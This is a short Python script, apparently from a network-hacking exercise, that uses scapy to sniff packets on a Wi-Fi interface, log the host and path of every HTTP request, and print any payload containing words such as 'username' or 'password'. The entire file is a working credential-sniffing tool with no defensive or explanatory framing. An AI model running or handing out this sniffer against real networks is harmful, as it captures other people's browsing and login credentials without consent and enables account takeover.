

import scapy.all as scapy
from scapy.layers import http





def sniff(interface):
    scapy.sniff(iface=interface ,store=False , prn=process_sniffed_packet)

def geturl(packet):

    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for key in keywords:
            if str.encode(key) in load:
                return load



def process_sniffed_packet(packet):
    # print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url=geturl(packet).decode("utf-8")

        print("[+] HTTP REQUEST >>" + url + "\n")
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n possible USERNAME AND PASSOWRD" + login_info.decode("utf-8") + "\n\n")


sniff("Wi-Fi")